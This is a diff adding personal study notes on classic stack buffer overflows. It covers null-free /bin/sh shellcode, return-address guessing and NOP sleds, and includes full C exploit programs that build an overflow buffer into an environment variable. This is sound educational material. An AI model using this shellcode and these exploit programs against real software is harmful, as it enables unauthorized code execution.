@@ -236,3 +236,178 @@ int    $0x80			# 2 bytes
 call   -0x2b                    # 5 bytes
 .string \"/bin/sh\"		# 8 byte
 ```
+- problem is code modifies itself, but most operating system mark code pages read-only
+	- get around it by placing the code in the stack or data segment, and transfer control to it
+		- place global array in the data segment. We need first a hex representation of the binary code
+```c
+void main() {
+__asm__("
+        jmp    0x2a                     # 3 bytes
+        popl   %esi                     # 1 byte
+        movl   %esi,0x8(%esi)           # 3 bytes
+        movb   $0x0,0x7(%esi)           # 4 bytes
+        movl   $0x0,0xc(%esi)           # 7 bytes
+        movl   $0xb,%eax                # 5 bytes
+        movl   %esi,%ebx                # 2 bytes
+        leal   0x8(%esi),%ecx           # 3 bytes
+        leal   0xc(%esi),%edx           # 3 bytes
+        int    $0x80                    # 2 bytes
+        movl   $0x1, %eax               # 5 bytes
+        movl   $0x0, %ebx               # 5 bytes
+        int    $0x80                    # 2 bytes
+        call   -0x2f                    # 5 bytes
+        .string \"/bin/sh\"             # 8 bytes
+");
+}
+```
+- obstacle: most cases we'll be trying to overflow a character buffer. Any null bytes in our shellcode will be considered the end of the string and he copy will be terminated
+	- there must be no null bytes in the shellcode for the exploit to work
+![[Screenshot 2025-09-27 at 23.33.56.png|400]]
+![[Screenshot 2025-09-27 at 23.35.14.png|500]]
+## Writing an Exploit
+```c
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+char large_string[128];
+
+void main() {
+  char buffer[96];
+  int i;
+  long *long_ptr = (long *) large_string;
+
+  for (i = 0; i < 32; i++)
+    *(long_ptr + i) = (int) buffer;
+
+  for (i = 0; i < strlen(shellcode); i++)
+    large_string[i] = shellcode[i];
+
+  strcpy(buffer,large_string);
+}
+```
+- filled the array `large_string[]` with the address of `buffer[]`
+- copy our shellcode into the beginning of the `large_string` string
+- `strcpy()` will then copy `large_string` onto buffer without doing any bounds checking, and will overflow the return address, overwriting it with the address where our code is now located
+- once we read the end of main and it tried to return it jumps to our code, and execs a shell
+- problem with overflowing another program: figure out what address the buffer is and thus where our code will be
+	- for every program the stack will start at the same address
+	- by knowing where the stack starts we can try to guess where the buffer we are trying to overflow will be
+- create a program that will print its stack pointer
+```c
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+void main() {
+  printf("0x%x\n", get_sp());
+}
+```
+- we can create a program that takes as a parameter a buffer size, and an offset from its own stack pointer. (where we believe the buffer we want to overflow may live)
+```c
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i;
+
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr += 4;
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+```
+- now we can try to guess what the buffer and offset should be
+	- not efficient process. Trying to guess the offset even while knowing where the beginning of the stack lives is nearly impossible
+	- can increase chances by padding the front of our overflow buffer with NOP instructions
+		- Fill half the overflow with NOP then we will place our shellcode at the centre, and then follow it with the return addresses
+		- if we are lucky and the return address points anywhere in the string of NOPs they will just get executed until they reach our code
+```c
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i;
+
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_sp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  for (i = 0; i < bsize/2; i++)
+    buff[i] = NOP;
+
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+```
+- a good selection for our buffer size is about 100 bytes more than the size of the buffer we are trying to overflow, this will place our code at the end of the buffer we are trying to overflow, giving a lot of space for the NOPs
+## Small Buffer Overflows
